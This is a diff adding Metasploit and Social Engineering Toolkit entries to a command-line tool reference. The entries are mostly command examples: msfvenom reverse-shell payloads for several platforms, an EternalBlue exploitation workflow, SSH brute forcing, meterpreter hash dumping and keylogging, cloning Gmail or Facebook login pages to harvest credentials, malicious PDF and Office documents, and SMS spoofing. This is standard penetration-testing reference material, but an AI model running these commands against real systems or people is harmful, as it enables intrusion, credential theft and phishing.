@@ -3336,3 +3336,355 @@ amass enum -d example.com -config config.ini
 
 ---
 
+
+## Exploitation Frameworks & Post-Exploitation
+
+### **metasploit** - Penetration Testing Framework**Difficulty**: ⭐⭐⭐⭐⭐ Expert
+
+<!-- metadata:
+category: Security Tools
+difficulty: ⭐⭐⭐⭐⭐ Expert
+aliases: [msfconsole, msfvenom, meterpreter]
+tags: [#security, #exploitation, #penetration-testing, #framework, #post-exploitation]
+related: [nmap, burpsuite, sqlmap, armitage]
+keywords: [metasploit, exploitation framework, penetration testing, msfconsole, msfvenom, meterpreter, exploit development]
+synonyms: [msf, exploitation-framework, pentest-framework]
+platform: [macOS, Linux, Windows]
+installation: brew install metasploit
+-->
+**Description**: The world's most used penetration testing framework - comprehensive exploit development and execution platform
+**Location**: `/opt/homebrew/bin/msfconsole`
+**Common Use Cases**:
+
+- Penetration testing
+- Exploit development
+- Vulnerability validation
+- Post-exploitation
+- Security research
+- Red team operations
+
+**Why Essential**: Industry-standard framework with 2000+ exploits, payloads, and auxiliary modules for comprehensive penetration testing.
+
+**See Also**: `nmap` (reconnaissance), `sqlmap` (web exploitation), `burpsuite` (web testing)
+
+**Examples**:
+
+```bash
+# Start Metasploit console
+msfconsole                                      # Interactive console
+msfconsole -q                                   # Quiet mode (no banner)
+
+# Basic commands
+help                                            # Show help
+search type:exploit platform:linux              # Search exploits
+use exploit/multi/handler                       # Use a module
+show options                                    # Show module options
+set LHOST 192.168.1.100                         # Set option
+run                                             # Execute module
+back                                            # Exit current module
+
+# Search for exploits
+search ms17-010                                 # EternalBlue
+search apache                                   # Apache exploits
+search wordpress                                # WordPress exploits
+search type:auxiliary smb                       # SMB auxiliary modules
+search cve:2021 platform:windows                # Windows CVEs from 2021
+
+# Information gathering
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set PORTS 1-1000
+run
+
+# SMB scanning
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.0/24
+run
+
+# Database commands
+workspace                                       # List workspaces
+workspace -a pentest                            # Add workspace
+workspace pentest                               # Switch workspace
+db_nmap -sV 192.168.1.1                        # Run nmap and save to DB
+hosts                                           # List discovered hosts
+services                                        # List discovered services
+vulns                                           # List vulnerabilities
+
+# Exploit usage
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.1.10
+set LHOST 192.168.1.100
+check                                           # Check if target is vulnerable
+exploit                                         # Run exploit
+
+# Payload generation with msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py
+
+# Encoding payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
+
+# List payloads
+msfvenom --list payloads                        # All payloads
+msfvenom --list payloads | grep meterpreter     # Meterpreter payloads
+msfvenom --list encoders                        # List encoders
+msfvenom --list formats                         # Output formats
+
+# Meterpreter commands (post-exploitation)
+# After getting a meterpreter session:
+sysinfo                                         # System information
+getuid                                          # Current user
+ps                                              # Process list
+migrate PID                                     # Migrate to process
+hashdump                                        # Dump password hashes
+screenshot                                      # Take screenshot
+keyscan_start                                   # Start keylogger
+keyscan_dump                                    # Dump keystrokes
+download /etc/passwd                            # Download file
+upload shell.exe C:\\Windows\\Temp              # Upload file
+shell                                           # Drop to system shell
+execute -f cmd.exe -i -H                        # Execute command
+
+# Session management
+sessions                                        # List active sessions
+sessions -i 1                                   # Interact with session 1
+sessions -u 1                                   # Upgrade to meterpreter
+sessions -K                                     # Kill all sessions
+
+# Handler for reverse connections
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit -j                                      # Run as background job
+
+# Resource scripts
+makerc /tmp/commands.rc                         # Save commands to script
+msfconsole -r script.rc                         # Run resource script
+
+# Web delivery
+use exploit/multi/script/web_delivery
+set PAYLOAD python/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+
+# Practical examples
+# Full attack workflow
+db_nmap -sV -p- 192.168.1.10                   # Scan and save to DB
+vulns                                           # Check for known vulns
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+exploit
+
+# Brute force SSH
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.0/24
+set USERNAME root
+set PASS_FILE /usr/share/wordlists/passwords.txt
+run
+
+# Post-exploitation enumeration
+run post/windows/gather/enum_shares               # Enumerate shares
+run post/windows/gather/credentials/windows_autologin  # AutoLogin creds
+run post/multi/recon/local_exploit_suggester      # Suggest privilege escalation
+
+# Pivoting
+route add 10.0.0.0/24 1                          # Add route through session 1
+use auxiliary/server/socks_proxy                 # SOCKS proxy
+run
+
+# Generate multi-platform payloads
+# Windows
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o payload.exe
+
+# Linux
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf
+
+# macOS
+msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o payload.macho
+
+# Android
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk
+```
+
+---
+
+
+### **set** - Social Engineering Toolkit**Difficulty**: ⭐⭐⭐⭐ Advanced
+
+<!-- metadata:
+category: Security Tools
+difficulty: ⭐⭐⭐⭐ Advanced
+aliases: [setoolkit]
+tags: [#security, #social-engineering, #phishing, #penetration-testing, #spear-phishing]
+related: [metasploit, gophish, beef]
+keywords: [social engineering toolkit, set, phishing, credential harvesting, spear phishing, social engineering]
+synonyms: [setoolkit, phishing-framework]
+platform: [macOS, Linux]
+installation: brew install set
+-->
+**Description**: Open-source social engineering framework designed for penetration testing and security awareness
+**Location**: `/opt/homebrew/bin/setoolkit`
+**Common Use Cases**:
+
+- Social engineering attacks
+- Phishing campaigns
+- Credential harvesting
+- Security awareness training
+- Penetration testing
+- Red team operations
+
+**Why Essential**: Specialized framework for social engineering attacks with numerous attack vectors and templates.
+
+**See Also**: `metasploit` (exploitation), `gophish` (phishing), `beef` (browser exploitation)
+
+**Examples**:
+
+```bash
+# Start SET
+setoolkit                                       # Interactive menu
+sudo setoolkit                                  # Run with sudo (required)
+
+# Main menu options:
+# 1) Social-Engineering Attacks
+# 2) Penetration Testing (Fast-Track)
+# 3) Third Party Modules
+# 4) Update the Social-Engineer Toolkit
+# 5) Update SET configuration
+# 6) Help, Credits, and About
+
+# Social Engineering Attacks menu:
+# 1) Spear-Phishing Attack Vectors
+# 2) Website Attack Vectors
+# 3) Infectious Media Generator
+# 4) Create a Payload and Listener
+# 5) Mass Mailer Attack
+# 6) Arduino-Based Attack Vector
+# 7) Wireless Access Point Attack Vector
+# 8) QRCode Generator Attack Vector
+# 9) Powershell Attack Vectors
+# 10) SMS Spoofing Attack Vector
+
+# Website Attack Vectors:
+# 1) Java Applet Attack Method
+# 2) Metasploit Browser Exploit Method
+# 3) Credential Harvester Attack Method
+# 4) Tabnabbing Attack Method
+# 5) Web Jacking Attack Method
+# 6) Multi-Attack Web Method
+# 7) HTA Attack Method
+
+# Credential Harvester example workflow:
+# 1. Select Social-Engineering Attacks
+# 2. Select Website Attack Vectors
+# 3. Select Credential Harvester Attack Method
+# 4. Select Site Cloner
+# 5. Enter IP address for POST back
+# 6. Enter URL to clone (e.g., https://gmail.com)
+# SET will clone the site and capture credentials
+
+# Spear-Phishing Attack example:
+# 1. Select Social-Engineering Attacks
+# 2. Select Spear-Phishing Attack Vectors
+# 3. Select Create a FileFormat Payload
+# 4. Select PDF Embedded EXE
+# 5. Choose payload (Metasploit reverse shell)
+# 6. Set LHOST and LPORT
+# 7. Create malicious PDF
+
+# Mass Mailer Attack:
+# 1. Select Social-Engineering Attacks
+# 2. Select Mass Mailer Attack
+# 3. Select E-Mail Attack (single/mass)
+# 4. Select Use a Gmail Account
+# 5. Enter Gmail credentials
+# 6. Enter target email addresses
+# 7. Craft email message
+# 8. Attach payload
+
+# Infectious Media Generator:
+# 1. Select Social-Engineering Attacks
+# 2. Select Infectious Media Generator
+# 3. Select File-Format Exploits
+# 4. Select PDF Embedded EXE
+# 5. Choose Metasploit payload
+# 6. Configure LHOST/LPORT
+# 7. Output infectious PDF
+
+# Powershell Attack Vectors:
+# 1. Select Social-Engineering Attacks
+# 2. Select Powershell Attack Vectors
+# 3. Select Powershell Alphanumeric Shellcode Injector
+# 4. Enter LHOST
+# 5. Enter LPORT
+# 6. Generate Powershell payload
+
+# QRCode Generator:
+# 1. Select Social-Engineering Attacks
+# 2. Select QRCode Generator Attack Vector
+# 3. Enter malicious URL
+# 4. SET generates QR code
+
+# Configuration
+# Edit: ~/.set/config
+# Key settings:
+# - METASPLOIT_PATH
+# - SENDMAIL
+# - WEBATTACK_EMAIL
+
+# Practical examples
+# Clone login page
+sudo setoolkit
+# 1 -> 2 -> 3 -> 2
+# Enter your IP: 192.168.1.100
+# Enter URL to clone: https://www.facebook.com
+# Victims visit http://192.168.1.100, enter creds
+# Credentials captured in SET terminal
+
+# Create malicious Office document
+sudo setoolkit
+# 1 -> 3 -> 1 -> 1
+# Select Metasploit payload
+# Configure LHOST/LPORT
+# Embed in Word/Excel document
+
+# Arduino-based attack
+sudo setoolkit
+# 1 -> 6
+# Create payload for Arduino
+# Deploy physical attack
+
+# SMS Spoofing
+sudo setoolkit
+# 1 -> 10
+# Configure SMS gateway
+# Send spoofed SMS
+
+# Update SET
+sudo setoolkit
+# 4 -> Update
+
+# Integration with Metasploit
+# SET can generate payloads that connect back to Metasploit
+# 1. Start Metasploit handler:
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
+
+# 2. Generate payload with SET
+sudo setoolkit
+# Create payload with matching LHOST/LPORT
+
+# Security awareness training
+# Use SET to demonstrate attack vectors
+# Show credential harvesting
+# Demonstrate phishing effectiveness
+# Train users to recognize attacks
+```
+
+---
+
